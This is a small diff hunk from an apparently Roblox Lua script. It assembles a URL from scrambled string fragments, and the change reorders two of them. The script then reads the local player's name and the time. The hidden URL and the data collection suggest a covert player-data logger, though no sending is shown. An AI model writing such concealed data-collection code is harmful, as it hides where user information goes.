@@ -11,7 +11,7 @@ local a10 = "044Ze-c8KfBEM"
 local a11 = "ZVghw6os5mj3npxkYT"
 local a12 = "drjkfqb0rfuiP"
 
-local url = a2 .. a4 .. a3 .. a1 .. a5 .. a6 .. a7 .. a8 .. a9 .. a10 .. a11 .. a12
+local url = a2 .. a4 .. a1 .. a3 .. a5 .. a6 .. a7 .. a8 .. a9 .. a10 .. a11 .. a12
 
 local username = game.Players.LocalPlayer.Name
 local time = os.date("!*t")
